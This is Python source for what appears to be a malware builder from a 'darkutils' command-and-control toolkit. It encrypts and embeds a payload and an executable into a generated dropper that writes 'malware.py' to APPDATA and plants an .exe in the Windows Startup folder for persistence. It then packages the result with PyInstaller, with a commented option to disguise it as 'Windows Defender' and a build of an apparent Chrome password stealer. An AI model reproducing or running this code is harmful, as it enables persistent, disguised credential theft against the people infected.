import sys
import os
import PyInstaller.__main__
import darkutils.c2_modules.encrypt as encrypt
from shutil import rmtree
from threading import Thread
import time


def exebuild(target, include, output, icon="icon.ico"):
    try:
        includes = []
        if len(include) > 0:
            includes = [include]

        PyInstaller.__main__.run([
            target,
            '--onefile',
            '--windowed',
            f'--icon={icon}',
            f'--name={output}',
            '--clean',
            '--log-level=DEBUG',
            *[f'--hidden-import={inc}' for inc in includes],
            '--exclude-module=doctest',
            '--exclude-module=pdb',
            '--exclude-module=unittest',
            '--exclude-module=difflib',
            '--exclude-module=msvcr71.dll',
            '--exclude-module=Crypt32.dll',
            '--exclude-module=tcl85.dll',
            '--exclude-module=tk85.dll',
            '--exclude-module=libcrypto-1_1-x64.dll',
        ])
    except BaseException as e:
        print(f"[+] Error: {e}")
    if os.path.exists(f"{output}.exe"):
        os.remove(f"{output}.exe")
    os.rename(f"dist/{target[:-3]}.exe", f"{output}.exe")
    rmtree("dist")
    rmtree("build")
    os.remove(f"{target[:-3]}.spec")
    return 0


def get_payload(filename: str):
    encrypt_file(filename)
    payload = []
    for line in open(filename, "rb"):
        payload.append(line)
    payload = b''.join(payload)
    decrypt_file(filename)
    return payload


def encrypt_file(filename: str):
    return print(encrypt.encrypt(filename=filename))


def decrypt_file(filename: str):
    return print(encrypt.fully_decrypt(filename=filename))


def gendie(filenames: list):
    for name in filenames:
        try:
            os.remove(f"{name}.py")
        except Exception as err:
            os.remove(f"{name}.exe")
    return 0


def generate_payload(filename, destname, startup, icon="icons/icon.ico", modulename="_c2"):
    payload = get_payload(filename)
    exepayload = exe_bytes(startup)
    start_str = "startups='" + str(startup) + "'\n"
    APPDATA = "APPDATA = getenv('APPDATA')\n"
    STARTUP = "STARTUP = f'{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{startups}.exe'\n"
    pyline = ""
    pyline += f"from os import getenv\n"
    pyline += start_str
    pyline += APPDATA
    pyline += STARTUP
    pyline += f"filename = 'malware.py'\n"
    pyline += "path2 = f'{APPDATA}\\\\{filename}'\n"
    pyline += f"payload = {payload}\n"
    pyline += f"exepayload = {exepayload}\n"
    pyline += f"with open(path2, 'wb') as f:\n"
    pyline += "    f.write(payload)\n"
    pyline += f"with open(STARTUP, 'wb') as f:\n"
    pyline += "    f.write(exepayload)"
    with open(f"_c2/{destname}.py", "wb") as f:
        f.write(pyline.encode())
    return f"{modulename}"


def exe_bytes(filename: str):
    bytelist = []
    for line in open(f"{filename}.exe", "rb"):
        bytelist.append(line)
    bytelist = b''.join(bytelist)
    return bytelist


if __name__ == "__main__":
    # exebuild(target="stub.py", include='darkutils.c2_modules.encrypt',
    #          output='Windows Defender', icon="icons/icon2.ico")
    exebuild(target="chromepass.py", include='',
             output="chromepass", icon="icons/icon2.ico")
